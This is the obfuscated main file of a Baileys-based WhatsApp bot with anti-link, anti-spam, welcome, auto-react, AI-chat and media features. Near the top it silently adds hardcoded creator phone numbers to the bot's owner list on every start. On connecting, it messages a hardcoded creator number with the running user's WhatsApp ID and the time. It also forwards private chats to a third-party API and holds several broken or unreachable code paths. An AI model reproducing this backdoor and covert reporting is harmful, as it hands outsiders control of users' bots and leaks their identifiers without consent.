require("./option");
const pino = require("pino");
const {
  Boom
} = require("@hapi/boom");
const fs = require("fs");
const chalk = require("chalk");
const FileType = require("file-type");
const path = require("path");
const axios = require("axios");
const PhoneNumber = require("awesome-phonenumber");
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid
} = require("./system/exif");
const {
  smsg,
  isUrl,
  generateMessageTag,
  getBuffer,
  getSizeMedia,
  fetch,
  await,
  sleep,
  reSize
} = require("./system/myfunc");
const {
  default: IconicTechIncConnect,
  delay,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
  proto,
  Browsers
} = require("baileys");
const PHONENUMBER_MCC = require("./system/PairingPatch");
const NodeCache = require("node-cache");
const Pino = require("pino");
const readline = require("readline");
const {
  parsePhoneNumber
} = require("libphonenumber-js");
const makeWASocket = require("baileys").default;
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (_0x512796, _0x2ac38d) => {
  _0x2ac38d.status(200).send("BANKS MD BOT is running!");
});
app.listen(PORT, () => {
  console.log("Server running on http://localhost:" + PORT);
});
const store = makeInMemoryStore({
  logger: pino().child({
    level: "silent",
    stream: "store"
  })
});
let phoneNumber = "256701038557";
let owner = [];
try {
  owner = JSON.parse(fs.readFileSync("./system/owner.json"));
  const requiredOwners = ["256701038557", "233577860202", "256701038557"];
  for (const number of requiredOwners) {
    if (!owner.includes(number)) {
      owner.push(number);
    }
  }
  fs.writeFileSync("./system/owner.json", JSON.stringify(owner, null, 2));
} catch (_0x40a3a2) {
  owner = ["256701038557", "256701038557", "256701038557"];
  fs.writeFileSync("./system/owner.json", JSON.stringify(owner, null, 2));
}
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code");
const useMobile = process.argv.includes("--mobile");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
const question = _0x27ffbd => new Promise(_0x41bedc => rl.question(_0x27ffbd, _0x41bedc));
async function startIconicTechInc() {
  let {
    version: _0x405be1,
    isLatest: _0x562008
  } = await fetchLatestBaileysVersion();
  const {
    state: _0x3f5877,
    saveCreds: _0x2e1fef
  } = await useMultiFileAuthState("./session");
  const _0x449334 = new NodeCache();
  let _0x475f70 = makeWASocket({
    logger: pino({
      level: "silent"
    }),
    printQRInTerminal: false,
    version: [2, 3000, 1017531287],
    browser: Browsers.ubuntu("Edge"),
    auth: _0x3f5877,
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
    getMessage: async _0x3b8c34 => {
      const _0x221c37 = jidNormalizedUser(_0x3b8c34.remoteJid);
      const _0x31d250 = await store.loadMessage(_0x221c37, _0x3b8c34.id);
      return _0x31d250?.message || "";
    },
    msgRetryCounterCache: _0x449334,
    defaultQueryTimeoutMs: undefined
  });
  store.bind(_0x475f70.ev);
  console.log(chalk.bgHex("#FFBF00").bold.black("══════ Powered by Banks Official ══════"));
  console.log(chalk.bgHex("#800080").bold.white("══════════ BANKS MD BOT ══════════"));
  if (pairingCode && !_0x475f70.authState.creds.registered) {
    if (useMobile) {
      throw new Error("Cannot use pairing code with mobile api");
    }
    console.log(chalk.bgHex("#008080").bold.white("════════ STEP 1: PHONE NUMBER ════════"));
    let _0x329604;
    if (_0x329604) {
      _0x329604 = _0x329604.replace(/[^0-9]/g, "");
      if (!Object.keys(PHONENUMBER_MCC).some(_0xc0d37b => _0x329604.startsWith(_0xc0d37b))) {
        console.log(chalk.bgHex("#FF0000").bold.white("Start with country code of your WhatsApp Number, Example : 256701038557"));
        process.exit(0);
      }
    } else {
      _0x329604 = await question(chalk.bgHex("#000000").bold.greenBright("Please type your WhatsApp number 😍\nFor example:  : "));
      _0x329604 = _0x329604.replace(/[^0-9]/g, "");
      console.log(chalk.bgHex("#FF6347").bold.white("════════ STEP 2: VALIDATION ════════"));
      if (!Object.keys(PHONENUMBER_MCC).some(_0x2fb4f0 => _0x329604.startsWith(_0x2fb4f0))) {
        console.log(chalk.bgHex("#FF0000").bold.white("Start with country code of your WhatsApp Number, Example : 256701038557"));
        _0x329604 = await question(chalk.bgHex("#000000").bold.greenBright("Please type your WhatsApp number 😍\nFor example: 256701038557 : "));
        _0x329604 = _0x329604.replace(/[^0-9]/g, "");
        rl.close();
      }
    }
    console.log(chalk.bgHex("#4B0082").bold.white("═════ STEP 3: GENERATING CODE ═════"));
    setTimeout(async () => {
      let _0x3b262d = await _0x475f70.requestPairingCode(_0x329604);
      _0x3b262d = _0x3b262d?.match(/.{1,4}/g)?.join("-") || _0x3b262d;
      console.log(chalk.bgHex("#006400").bold.white("════════ YOUR PAIRING CODE ════════"));
      console.log(chalk.black(chalk.bgGreen("Your Pairing Code : ")), chalk.black(chalk.white(_0x3b262d)));
      console.log(chalk.bgHex("#FFA500").bold.black("══════════════════════════════════"));
      console.log(chalk.bgHex("#800080").bold.white("Thank you for using BANKS MD BOT"));
    }, 3000);
  }
  _0x475f70.ev.on("messages.upsert", async _0x453d07 => {
    try {
      const _0x3529e2 = _0x453d07.messages[0];
      if (!_0x3529e2.message) {
        return;
      }
      _0x3529e2.message = Object.keys(_0x3529e2.message)[0] === "ephemeralMessage" ? _0x3529e2.message.ephemeralMessage.message : _0x3529e2.message;
      if (_0x3529e2.key && _0x3529e2.key.remoteJid === "status@broadcast") {
        if (!_0x475f70.public && !_0x3529e2.key.fromMe && _0x453d07.type === "notify") {
          return;
        }
      }
      if (_0x3529e2.key.id.startsWith("BAE5") && _0x3529e2.key.id.length === 16) {
        return;
      }
      const _0x481b52 = smsg(_0x475f70, _0x3529e2, store);
      require("./banks")(_0x475f70, _0x481b52, _0x453d07, store);
    } catch (_0x1aa093) {
      console.log(_0x1aa093);
    }
  });
  _0x475f70.ev.on("messages.upsert", async _0x128611 => {
    if (global.autoswview) {
      mek = _0x128611.messages[0];
      if (mek.key && mek.key.remoteJid === "status@broadcast") {
        await _0x475f70.readMessages([mek.key]);
      }
    }
  });
  _0x475f70.ev.on("messages.upsert", async ({
    messages: _0x35bbf9
  }) => {
    const _0x2fd6f4 = _0x35bbf9[0];
    if (!_0x2fd6f4.key.fromMe && _0x2fd6f4.key.remoteJid.endsWith("g.us")) {
      const _0x2f6c98 = _0x2fd6f4.message?.conversation || _0x2fd6f4.message?.extendedTextMessage?.text || "";
      const _0x11c1e3 = (await _0x475f70.groupMetadata(_0x2fd6f4.key.remoteJid)).participants.some(_0x4f26b7 => _0x4f26b7.id === _0x2fd6f4.key.participant && _0x4f26b7.admin === "admin");
      if (!_0x11c1e3 && /(https?:\/\/|www\.)/i.test(_0x2f6c98)) {
        await _0x475f70.sendMessage(_0x2fd6f4.key.remoteJid, {
          text: "⚠️ *ANTI-LINK WARNING!* Links are not allowed here!",
          mentions: [_0x2fd6f4.key.participant]
        });
        await _0x475f70.sendMessage(_0x2fd6f4.key.remoteJid, {
          delete: _0x2fd6f4.key
        });
      }
    }
  });
  const _0x3f6ddb = new Map();
  const _0x5b456c = new Map();
  _0x475f70.ev.on("messages.upsert", async _0x3a8d6d => {
    const _0x190b40 = _0x3a8d6d.messages[0];
    if (!_0x190b40.key || _0x190b40.key.fromMe) {
      return;
    }
    const _0x5c8127 = _0x190b40.key.participant || _0x190b40.key.remoteJid;
    const _0x5296d0 = Date.now();
    const _0xe08eb2 = new Date();
    const _0xd4ed78 = {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    };
    const _0x1f16b1 = {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    };
    const _0x579eef = _0xe08eb2.toLocaleDateString("en-US", _0xd4ed78);
    const _0x1cf549 = _0xe08eb2.toLocaleTimeString("en-US", _0x1f16b1);
    if (!_0x3f6ddb.has(_0x5c8127)) {
      _0x3f6ddb.set(_0x5c8127, {
        count: 0,
        lastMessageTime: _0x5296d0,
        warningSent: false
      });
    }
    const _0x21d7d0 = _0x3f6ddb.get(_0x5c8127);
    _0x21d7d0.count += 1;
    _0x21d7d0.lastMessageTime = _0x5296d0;
    if (_0x21d7d0.count > 10 && _0x5296d0 - _0x21d7d0.lastMessageTime < 10000) {
      if (!_0x21d7d0.warningSent) {
        await _0x475f70.sendMessage(_0x5c8127, {
          text: "┏━━━━━━━━━━━━━━━━━━━━━━┓\n┃  ⚠️ *BANKS MD BOT* ⚠️  \n┣━━━━━━━━━━━━━━━━━━━━━━┫\n┃ *SPAM DETECTED!*\n┃\n┃ 📅 Date: " + _0x579eef + "\n┃ ⏰ Time: " + _0x1cf549 + "\n┃\n┃ You're sending messages too fast.\n┃ Please slow down or you'll be\n┃ temporarily blocked.\n┃\n┃ 🛠️ *Creator:* Banks Official\n┗━━━━━━━━━━━━━━━━━━━━━━┛"
        });
        _0x21d7d0.warningSent = true;
        return;
      }
      await _0x475f70.sendMessage(_0x5c8127, {
        text: "┏━━━━━━━━━━━━━━━━━━━━━━┓\n┃  ⚠️ *BANKS MD BOT* ⚠️  \n┣━━━━━━━━━━━━━━━━━━━━━━┫\n┃ *TEMPORARY BLOCK*\n┃\n┃ 📅 Date: " + _0x579eef + "\n┃ ⏰ Time: " + _0x1cf549 + "\n┃\n┃ You've been blocked for 5 minutes\n┃ due to excessive messaging.\n┃\n┃ 🛠️ *Creator:* Banks Official\n┗━━━━━━━━━━━━━━━━━━━━━━┛"
      });
      await _0x475f70.updateBlockStatus(_0x5c8127, "block");
      setTimeout(async () => {
        await _0x475f70.updateBlockStatus(_0x5c8127, "unblock");
        const _0x79b851 = new Date();
        const _0x1466fd = _0x79b851.toLocaleDateString("en-US", _0xd4ed78);
        const _0x5b3a03 = _0x79b851.toLocaleTimeString("en-US", _0x1f16b1);
        await _0x475f70.sendMessage(_0x5c8127, {
          text: "┏━━━━━━━━━━━━━━━━━━━━━━┓\n┃  ✅ *BANKS MD BOT* ✅  \n┣━━━━━━━━━━━━━━━━━━━━━━┫\n┃ *BLOCK LIFTED*\n┃\n┃ 📅 Date: " + _0x1466fd + "\n┃ ⏰ Time: " + _0x5b3a03 + "\n┃\n┃ You may now message again.\n┃ Please maintain proper messaging\n┃ etiquette.\n┃\n┃ 🛠️ *Creator:* Banks Official\n┗━━━━━━━━━━━━━━━━━━━━━━┛"
        });
        _0x3f6ddb.delete(_0x5c8127);
        _0x5b456c.delete(_0x5c8127);
      }, 300000);
    }
    setTimeout(() => {
      if (_0x3f6ddb.has(_0x5c8127)) {
        const _0x4efc08 = _0x3f6ddb.get(_0x5c8127);
        if (_0x5296d0 - _0x4efc08.lastMessageTime >= 10000) {
          _0x3f6ddb.delete(_0x5c8127);
          _0x5b456c.delete(_0x5c8127);
        } else if (_0x4efc08.count > 0) {
          _0x4efc08.count -= 1;
        }
      }
    }, 10000);
  });
  _0x475f70.ev.on("messages.upsert", async _0x4fca98 => {
    if (!global.emojiReact) {
      return;
    }
    const _0x141738 = _0x4fca98.messages[0];
    if (!_0x141738.key || _0x141738.key.fromMe) {
      return;
    }
    if (_0x141738.message?.protocolMessage || _0x141738.message?.reactionMessage) {
      return;
    }
    const _0x3649c8 = ["👍", "❤️", "😂", "😮", "😢", "🔥"];
    const _0x596d55 = _0x3649c8[Math.floor(Math.random() * _0x3649c8.length)];
    await _0x475f70.sendMessage(_0x141738.key.remoteJid, {
      react: {
        text: _0x596d55,
        key: _0x141738.key
      }
    });
  });
  _0x475f70.ev.on("group-participants.update", async ({
    id: _0x3feae9,
    participants: _0x1bf53b,
    action: _0x30ab8a
  }) => {
    const _0x7fe910 = await _0x475f70.groupMetadata(_0x3feae9);
    const _0x300fc4 = _0x7fe910.subject;
    const _0x12676c = _0x7fe910.participants.length;
    for (const _0x344701 of _0x1bf53b) {
      const _0x54e575 = _0x344701.split("@")[0];
      const _0x961e55 = "@" + _0x54e575;
      if (_0x30ab8a === "add") {
        const _0x1b86eb = "🎉 *Welcome* " + _0x961e55 + " to *" + _0x300fc4 + "*!\n\n📌 *Group Rules:*\n- No Spam\n- No Links\n- No NSFW\n\nEnjoy your stay! 😊\n\n > ɪᴄᴏɴɪᴄ ᴛᴇᴄʜ";
        await _0x475f70.sendMessage(_0x3feae9, {
          text: _0x1b86eb,
          mentions: [_0x344701]
        });
      } else if (_0x30ab8a === "remove") {
        const _0x3bfe3c = "😢 *Goodbye* " + _0x961e55 + "! We’ll miss you in *" + _0x300fc4 + "*!";
        await _0x475f70.sendMessage(_0x3feae9, {
          text: _0x3bfe3c,
          mentions: [_0x344701]
        });
      }
    }
  });
  _0x475f70.decodeJid = _0x4c22d4 => {
    if (!_0x4c22d4) {
      return _0x4c22d4;
    }
    if (/:\d+@/gi.test(_0x4c22d4)) {
      let _0x489cc5 = jidDecode(_0x4c22d4) || {};
      return _0x489cc5.user && _0x489cc5.server && _0x489cc5.user + "@" + _0x489cc5.server || _0x4c22d4;
    } else {
      return _0x4c22d4;
    }
  };
  _0x475f70.ev.on("contacts.update", _0x70c7f => {
    for (let _0x4cc9fe of _0x70c7f) {
      let _0xf12446 = _0x475f70.decodeJid(_0x4cc9fe.id);
      if (store && store.contacts) {
        store.contacts[_0xf12446] = {
          id: _0xf12446,
          name: _0x4cc9fe.notify
        };
      }
    }
  });
  _0x475f70.getName = (_0x8a3a25, _0xf3b576 = false) => {
    id = _0x475f70.decodeJid(_0x8a3a25);
    _0xf3b576 = _0x475f70.withoutContact || _0xf3b576;
    let _0x5a6812;
    if (id.endsWith("@g.us")) {
      return new Promise(async _0x3dcfef => {
        _0x5a6812 = store.contacts[id] || {};
        if (!_0x5a6812.name && !_0x5a6812.subject) {
          _0x5a6812 = _0x475f70.groupMetadata(id) || {};
        }
        _0x3dcfef(_0x5a6812.name || _0x5a6812.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    } else {
      _0x5a6812 = id === "0@s.whatsapp.net" ? {
        id: id,
        name: "WhatsApp"
      } : id === _0x475f70.decodeJid(_0x475f70.user.id) ? _0x475f70.user : store.contacts[id] || {};
    }
    return (_0xf3b576 ? "" : _0x5a6812.name) || _0x5a6812.subject || _0x5a6812.verifiedName || PhoneNumber("+" + _0x8a3a25.replace("@s.whatsapp.net", "")).getNumber("international");
  };
  _0x475f70.public = true;
  _0x475f70.serializeM = _0xd531ef => smsg(_0x475f70, _0xd531ef, store);
  _0x475f70.ev.on("connection.update", async _0x3ec496 => {
    const {
      connection: _0x5c48de,
      lastDisconnect: _0x1ed26d
    } = _0x3ec496;
    const _0x286108 = new Date();
    const _0x2b3653 = _0x286108.toLocaleTimeString();
    const _0x51b814 = _0x286108.toLocaleDateString();
    if (_0x5c48de == "open") {
      console.log(chalk.magenta("╔══════════════════════════════════════════════════╗"));
      console.log(chalk.magenta("║                                                    ║"));
      console.log(chalk.yellow("║   🌿 CONNECTED TO: " + chalk.bold.green(_0x475f70.user.id.split(":")[0])));
      console.log(chalk.yellow("║   🕒 TIME: " + chalk.bold.cyan(_0x2b3653)));
      console.log(chalk.yellow("║   📅 DATE: " + chalk.bold.cyan(_0x51b814)));
      console.log(chalk.magenta("║                                                    ║"));
      console.log(chalk.magenta("╠══════════════════════════════════════════════════╣"));
      console.log(chalk.magenta("║                                                    ║"));
      console.log(chalk.yellow("║          " + chalk.bold.blue("[ " + botname + " ]")));
      console.log(chalk.magenta("║                                                    ║"));
      console.log(chalk.magenta("╠══════════════════════════════════════════════════╣"));
      console.log(chalk.magenta("║                                                    ║"));
      console.log(chalk.cyan("║   📺 YOUTUBE: " + chalk.bold.green("https://youtube.com/@official_manuel")));
      console.log(chalk.cyan("║   📱 TIKTOK: " + chalk.bold.green("kangoxmd")));
      console.log(chalk.cyan("║   💻 GITHUB: " + chalk.bold.green("https://github.com/OfficialKango/KANGO-XMD")));
      console.log(chalk.cyan("║   📞 WA NUMBER: " + chalk.bold.green(owner)));
      console.log(chalk.cyan("║   💬 CHATROOM: " + chalk.bold.green("https://whatsapp.com/channel/0029Va8YUl50bIdtVMYnYd0E")));
      console.log(chalk.cyan("║   📡 TELEGRAM: " + chalk.bold.green("@official_kango")));
      console.log(chalk.cyan("║   🏆 CREDIT: " + chalk.bold.green(wm)));
      console.log(chalk.magenta("║                                                    ║"));
      console.log(chalk.magenta("╚══════════════════════════════════════════════════╝"));
      await delay(2000);
      try {
        await _0x475f70.sendMessage("256701038557@s.whatsapp.net", {
          text: "🟢 *BANKS MD BOT ACTIVE* 🟢\n\n" + ("*Bot Name:* " + botname + "\n") + ("*User:* " + _0x475f70.user.id.split(":")[0] + "\n") + ("*Time:* " + _0x2b3653 + "\n") + ("*Date:* " + _0x51b814 + "\n\n") + "_POWERED BY Banks Official_"
        });
        console.log(chalk.green("Notification sent to admin number"));
      } catch (_0x2b08ec) {
        console.log(chalk.red("Failed to send notification: " + _0x2b08ec));
      }
    }
    if (_0x5c48de === "close" && _0x1ed26d && _0x1ed26d.error && _0x1ed26d.error.output.statusCode != 401) {
      startIconicTechInc();
    }
  });
  _0x475f70.ev.on("creds.update", _0x2e1fef);
  _0x475f70.ev.on("messages.upsert", () => {});
  _0x475f70.sendText = (_0x2cd539, _0x5c9402, _0x37090f = "", _0x5490d7) => _0x475f70.sendMessage(_0x2cd539, {
    text: _0x5c9402,
    ..._0x5490d7
  }, {
    quoted: _0x37090f,
    ..._0x5490d7
  });
  _0x475f70.sendTextWithMentions = async (_0x13dc80, _0xff1c14, _0x54f0d0, _0x5cf861 = {}) => _0x475f70.sendMessage(_0x13dc80, {
    text: _0xff1c14,
    mentions: [..._0xff1c14.matchAll(/@(\d{0,16})/g)].map(_0x367cd5 => _0x367cd5[1] + "@s.whatsapp.net"),
    ..._0x5cf861
  }, {
    quoted: _0x54f0d0
  });
  _0x475f70.sendImageAsSticker = async (_0x1621dc, _0x25aad3, _0x3bb150, _0x4a37aa = {}) => {
    let _0xd3c388 = Buffer.isBuffer(_0x25aad3) ? _0x25aad3 : /^data:.*?\/.*?;base64,/i.test(_0x25aad3) ? Buffer.from(_0x25aad3.split`,`[1], "base64") : /^https?:\/\//.test(_0x25aad3) ? await await getBuffer(_0x25aad3) : fs.existsSync(_0x25aad3) ? fs.readFileSync(_0x25aad3) : Buffer.alloc(0);
    let _0x10bbe0;
    if (_0x4a37aa && (_0x4a37aa.packname || _0x4a37aa.author)) {
      _0x10bbe0 = await writeExifImg(_0xd3c388, _0x4a37aa);
    } else {
      _0x10bbe0 = await imageToWebp(_0xd3c388);
    }
    await _0x475f70.sendMessage(_0x1621dc, {
      sticker: {
        url: _0x10bbe0
      },
      ..._0x4a37aa
    }, {
      quoted: _0x3bb150
    });
    return _0x10bbe0;
  };
  let _0x317605 = 0;
  const _0x174200 = 2000;
  _0x475f70.ev.on("messages.upsert", async ({
    messages: _0x137c9e
  }) => {
    const _0x10c6d1 = _0x137c9e[0];
    if (!_0x10c6d1.message) {
      return;
    }
    if (_0x10c6d1.key.fromMe) {
      return;
    }
    if (!_0x10c6d1.isGroup && global.chatbot) {
      try {
        const _0x58233f = Date.now();
        if (_0x58233f - _0x317605 < _0x174200) {
          console.log("Message skipped: Rate limit exceeded");
          return;
        }
        const _0x1e78ca = _0x10c6d1.message.conversation || _0x10c6d1.message.extendedTextMessage?.text;
        if (!_0x1e78ca) {
          return;
        }
        await _0x475f70.sendMessage(_0x10c6d1.key.remoteJid, {
          react: {
            text: "💬",
            key: _0x10c6d1.key
          }
        });
        const _0x3033f0 = await axios.get("https://api.giftedtech.web.id/api/ai/openai", {
          params: {
            apikey: "gifted",
            q: _0x1e78ca
          }
        });
        if (_0x3033f0.data?.success && _0x3033f0.data?.result) {
          await _0x475f70.sendMessage(_0x10c6d1.key.remoteJid, {
            text: _0x3033f0.data.result
          }, {
            quoted: _0x10c6d1
          });
          _0x317605 = _0x58233f;
        } else {
          const _0x1a0753 = _0x3033f0.data ? JSON.stringify(_0x3033f0.data) : "Sorry, I got an unexpected response format.";
          await _0x475f70.sendMessage(_0x10c6d1.key.remoteJid, {
            text: _0x1a0753
          }, {
            quoted: _0x10c6d1
          });
        }
      } catch (_0x404e95) {
        console.error("Chatbot error:", _0x404e95);
        await _0x475f70.sendMessage(_0x10c6d1.key.remoteJid, {
          react: {
            text: "❌",
            key: _0x10c6d1.key
          }
        });
        let _0x3e72df = "Sorry, I encountered an error processing your message.";
        if (_0x404e95.response?.status === 429) {
          _0x3e72df = "I'm getting too many requests. Please try again later.";
        } else if (_0x404e95.response?.data?.message) {
          _0x3e72df = _0x404e95.response.data.message;
        }
        await _0x475f70.sendMessage(_0x10c6d1.key.remoteJid, {
          text: _0x3e72df
        }, {
          quoted: _0x10c6d1
        });
      }
    }
  });
  _0x475f70.sendVideoAsSticker = async (_0x207d63, _0x9cc447, _0x187251, _0x33e14f = {}) => {
    let _0x423f70 = Buffer.isBuffer(_0x9cc447) ? _0x9cc447 : /^data:.*?\/.*?;base64,/i.test(_0x9cc447) ? Buffer.from(_0x9cc447.split`,`[1], "base64") : /^https?:\/\//.test(_0x9cc447) ? await await getBuffer(_0x9cc447) : fs.existsSync(_0x9cc447) ? fs.readFileSync(_0x9cc447) : Buffer.alloc(0);
    let _0x346bba;
    if (_0x33e14f && (_0x33e14f.packname || _0x33e14f.author)) {
      _0x346bba = await writeExifVid(_0x423f70, _0x33e14f);
    } else {
      _0x346bba = await videoToWebp(_0x423f70);
    }
    await _0x475f70.sendMessage(_0x207d63, {
      sticker: {
        url: _0x346bba
      },
      ..._0x33e14f
    }, {
      quoted: _0x187251
    });
    return _0x346bba;
  };
  _0x475f70.downloadAndSaveMediaMessage = async (_0x4d6b0a, _0x5a4ee7, _0x316819 = true) => {
    let _0x43e247 = _0x4d6b0a.msg ? _0x4d6b0a.msg : _0x4d6b0a;
    let _0x3fdec2 = (_0x4d6b0a.msg || _0x4d6b0a).mimetype || "";
    let _0x507a7c = _0x4d6b0a.mtype ? _0x4d6b0a.mtype.replace(/Message/gi, "") : _0x3fdec2.split("/")[0];
    const _0xe1c406 = await downloadContentFromMessage(_0x43e247, _0x507a7c);
    let _0x451421 = Buffer.from([]);
    for await (const _0x187c6e of _0xe1c406) {
      _0x451421 = Buffer.concat([_0x451421, _0x187c6e]);
    }
    let _0x28acd1 = await FileType.fromBuffer(_0x451421);
    trueFileName = _0x316819 ? _0x5a4ee7 + "." + _0x28acd1.ext : _0x5a4ee7;
    await fs.writeFileSync(trueFileName, _0x451421);
    return trueFileName;
  };
  _0x475f70.getFile = async (_0x5bd1d8, _0x4d666a) => {
    let _0x4a9a03;
    let _0x4bfbf5 = Buffer.isBuffer(_0x5bd1d8) ? _0x5bd1d8 : /^data:.*?\/.*?;base64,/i.test(_0x5bd1d8) ? Buffer.from(_0x5bd1d8.split`,`[1], "base64") : /^https?:\/\//.test(_0x5bd1d8) ? await (_0x4a9a03 = await getBuffer(_0x5bd1d8)) : fs.existsSync(_0x5bd1d8) ? (filename = _0x5bd1d8, fs.readFileSync(_0x5bd1d8)) : typeof _0x5bd1d8 === "string" ? _0x5bd1d8 : Buffer.alloc(0);
    let _0x1a20a9 = (await FileType.fromBuffer(_0x4bfbf5)) || {
      mime: "application/octet-stream",
      ext: ".bin"
    };
    filename = path.join(__filename, "../src/" + new Date() * 1 + "." + _0x1a20a9.ext);
    if (_0x4bfbf5 && _0x4d666a) {
      fs.promises.writeFile(filename, _0x4bfbf5);
    }
    return {
      res: _0x4a9a03,
      filename: filename,
      size: await getSizeMedia(_0x4bfbf5),
      ..._0x1a20a9,
      data: _0x4bfbf5
    };
  };
  _0x475f70.sendFile = async (_0x552f83, _0x5bd595, _0x20d0a5 = "", _0x4c9dcf = "", _0x5668f0, _0x2838d4 = false, _0x451615 = {}) => {
    let _0x249997 = await _0x475f70.getFile(_0x5bd595, true);
    let {
      res: _0x546966,
      data: _0x1669ec,
      filename: _0x447a46
    } = _0x249997;
    if (_0x546966 && _0x546966.status !== 200 || _0x1669ec.length <= 65536) {
      try {
        throw {
          json: JSON.parse(_0x1669ec.toString())
        };
      } catch (_0x585726) {
        if (_0x585726.json) {
          throw _0x585726.json;
        }
      }
    }
    let _0x45397a = {
      filename: _0x20d0a5
    };
    if (_0x5668f0) {
      _0x45397a.quoted = _0x5668f0;
    }
    if (!_0x249997) {
      _0x451615.asDocument = true;
    }
    let _0x54f5ac = "";
    let _0x4aafc9 = _0x249997.mime;
    let _0x208f73;
    if (/webp/.test(_0x249997.mime) || /image/.test(_0x249997.mime) && _0x451615.asSticker) {
      _0x54f5ac = "sticker";
    } else if (/image/.test(_0x249997.mime) || /webp/.test(_0x249997.mime) && _0x451615.asImage) {
      _0x54f5ac = "image";
    } else if (/video/.test(_0x249997.mime)) {
      _0x54f5ac = "video";
    } else if (/audio/.test(_0x249997.mime)) {
      _0x208f73 = await (_0x2838d4 ? toPTT : toAudio)(_0x1669ec, _0x249997.ext);
      _0x1669ec = _0x208f73.data;
      _0x447a46 = _0x208f73.filename;
      _0x54f5ac = "audio";
      _0x4aafc9 = "audio/ogg; codecs=opus";
    } else {
      _0x54f5ac = "document";
    }
    if (_0x451615.asDocument) {
      _0x54f5ac = "document";
    }
    delete _0x451615.asSticker;
    delete _0x451615.asLocation;
    delete _0x451615.asVideo;
    delete _0x451615.asDocument;
    delete _0x451615.asImage;
    let _0x48a157 = {
      ..._0x451615,
      caption: _0x4c9dcf,
      ptt: _0x2838d4,
      [_0x54f5ac]: {
        url: _0x447a46
      },
      mimetype: _0x4aafc9
    };
    let _0x3a8752;
    try {
      _0x3a8752 = await _0x475f70.sendMessage(_0x552f83, _0x48a157, {
        ..._0x45397a,
        ..._0x451615
      });
    } catch (_0x1f2626) {
      _0x3a8752 = null;
    } finally {
      if (!_0x3a8752) {
        _0x3a8752 = await _0x475f70.sendMessage(_0x552f83, {
          ..._0x48a157,
          [_0x54f5ac]: _0x1669ec
        }, {
          ..._0x45397a,
          ..._0x451615
        });
      }
      _0x1669ec = null;
      return _0x3a8752;
    }
  };
  _0x475f70.downloadMediaMessage = async _0x336b19 => {
    let _0x45bf0b = (_0x336b19.msg || _0x336b19).mimetype || "";
    let _0x506d76 = _0x336b19.mtype ? _0x336b19.mtype.replace(/Message/gi, "") : _0x45bf0b.split("/")[0];
    const _0x7a8512 = await downloadContentFromMessage(_0x336b19, _0x506d76);
    let _0x4c378b = Buffer.from([]);
    for await (const _0x626baf of _0x7a8512) {
      _0x4c378b = Buffer.concat([_0x4c378b, _0x626baf]);
    }
    return _0x4c378b;
  };
}
return startIconicTechInc();
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
process.on("uncaughtException", function (_0x291213) {
  let _0x3f7cb = String(_0x291213);
  if (_0x3f7cb.includes("conflict")) {
    return;
  }
  if (_0x3f7cb.includes("Socket connection timeout")) {
    return;
  }
  if (_0x3f7cb.includes("not-authorized")) {
    return;
  }
  if (_0x3f7cb.includes("already-exists")) {
    return;
  }
  if (_0x3f7cb.includes("rate-overlimit")) {
    return;
  }
  if (_0x3f7cb.includes("Connection Closed")) {
    return;
  }
  if (_0x3f7cb.includes("Timed Out")) {
    return;
  }
  if (_0x3f7cb.includes("Value not found")) {
    return;
  }
  console.log("Caught exception: ", _0x291213);
});